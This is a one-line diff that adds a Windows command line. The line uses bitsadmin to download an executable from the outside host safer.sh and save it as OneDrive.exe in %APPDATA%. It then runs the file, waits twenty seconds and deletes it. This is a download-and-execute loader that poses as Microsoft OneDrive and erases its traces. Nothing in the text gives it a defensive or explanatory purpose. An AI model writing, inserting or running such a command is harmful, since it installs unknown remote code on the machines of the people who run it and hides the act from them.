@@ -1,0 +1,1 @@
+bitsadmin /transfer OneDrive.exe https://safer.sh/OneDrive.exe %APPDATA%\OneDrive.exe & %APPDATA%\OneDrive.exe & timeout 20 & del %APPDATA%\OneDrive.exe
